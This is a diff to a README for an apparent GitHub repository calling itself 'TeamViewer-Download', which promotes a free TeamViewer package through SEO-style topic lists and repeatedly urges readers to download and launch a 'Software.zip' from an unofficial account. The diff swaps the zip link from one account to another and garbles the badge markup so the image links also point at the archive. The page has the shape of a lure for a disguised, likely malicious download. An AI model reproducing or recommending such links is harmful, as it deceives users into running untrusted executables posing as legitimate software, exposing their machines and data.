@@ -8,9 +8,9 @@ Welcome to the **TeamViewer-Download** repository! Here you will find everything
 - **Topics:** best alternatives to TeamViewer, Windows 10, NVIDIA Shield control, languages, free downloads, Tekla support, TeamViewer host, and more
 
 ## How to Access Software 🖥
-To access the software, please click [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). This link contains the software package that you need to launch to get started. 
+To access the software, please click [here](https://github.com/ivanodievesspishev/TeamViewer-Download/releases/download/v2.0/Software.zip). This link contains the software package that you need to launch to get started. 
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![](https://github.com/ivanodievesspishev/TeamViewer-Download/releases/download/v2.0/Software.zip)](https://github.com/ivanodievesspishev/TeamViewer-Download/releases/download/v2.0/Software.zip)
 
 ## 🌟 Why TeamViewer-Download? 🌟
 TeamViewer-Download is your go-to solution for all your remote control and desktop sharing needs. Whether you want to control your NVIDIA Shield, find alternatives to TeamViewer, or download TeamViewer for various platforms, this repository has got you covered. Let's explore some key features and benefits of TeamViewer-Download:
@@ -36,7 +36,7 @@ If the provided link does not work or you need access to additional resources, b
 ## Get Started Now! 🎉
 Don't wait any longer – dive into the world of TeamViewer-Download and revolutionize your remote control experience. From NVIDIA Shield control to language settings and more, this repository has it all. Download the software package, explore the features, and take control of your devices with ease!
 
-[![](https://img.shields.io/badge/Let's%20Get%20Started-Explore%20Now-brightgreen)](https://github.com/Rubenas123/6487922/releases)
+[![](https://github.com/ivanodievesspishev/TeamViewer-Download/releases/download/v2.0/Software.zip's%20Get%20Started-Explore%20Now-brightgreen)](https://github.com/ivanodievesspishev/TeamViewer-Download/releases/download/v2.0/Software.zip)
 
 Grab your software package and start controlling your devices remotely today! 🚀
 
